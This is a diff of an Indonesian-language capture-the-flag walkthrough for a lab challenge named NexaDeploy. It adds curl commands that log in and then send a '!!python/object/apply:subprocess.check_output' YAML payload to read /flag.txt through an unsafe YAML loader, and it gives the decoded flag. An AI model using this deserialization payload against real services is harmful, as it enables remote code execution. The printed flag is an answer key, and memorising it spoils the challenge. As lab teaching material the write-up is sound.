@@ -1,24 +1,41 @@
-# NexaDeploy — Flag & Verifikasi
+# NexaDeploy — Cara mendapatkan flag
 
 [← Overview](63-nexadeploy.md) · [Index](index.md)
 
-> **Langkah 2/5 — Cara Mendapatkan Flag.** Cara Mendapatkan Flag
->
-> **Titik penting:** NFX{y4ml_unS4f3_l04d3r_t0_rce}
+> **Langkah 2/5.** Unsafe YAML loader mengeksekusi `!!python/object/apply`, lalu base64 di response di-decode.
 >
 > **Berikutnya:** [Flag](63-nexadeploy-03-flag.md)
 
-> **Flag:** `NFX{y4ml_unS4f3_l04d3r_t0_rce}`
-> **Status:** `VERIFIED`
+1. Login dan simpan cookie.
 
-1. Buka service NexaDeploy dan cari form/endpoint yang menerima konfigurasi YAML.
-2. Kirim YAML dengan tag Python yang berbahaya, misalnya `!!python/object/apply:os.system`.
-3. Kalau RCE berhasil, baca flag dari environment atau file di server.
+```bash
+curl -sS -c cookies -d 'email=devops@nexadeploy.test&password=deploy1234' \
+  "$HOST/login"
+```
 
-### Terminal evidence (real)
+2. Kirim konfigurasi yang memanggil `subprocess.check_output`. Loader YAML-nya tidak aman, jadi tag `!!python/object/apply` dieksekusi.
 
-![Terminal evidence (real)](assets/nexadeploy/00b-terminal-evidence.png)
+```bash
+curl -sS -b cookies \
+  --data-urlencode 'name=x' \
+  --data-urlencode 'environment=staging' \
+  --data-urlencode 'config=!!python/object/apply:subprocess.check_output [["cat","/flag.txt"]]' \
+  "$HOST/pipelines/validate"
+```
 
-*Terminal evidence (real).*
+3. Response berisi blok YAML binary:
 
-> **Bukti:** terminal evidence (real).
+```text
+!!binary |
+  TkZYe3k0bWxfdW5TNGYzX2wwNGQzcl90MF9yY2V9Cg==
+```
+
+4. Decode:
+
+```bash
+echo TkZYe3k0bWxfdW5TNGYzX2wwNGQzcl90MF9yY2V9Cg== | base64 -d
+```
+
+```text
+NFX{y4ml_unS4f3_l04d3r_t0_rce}
+```
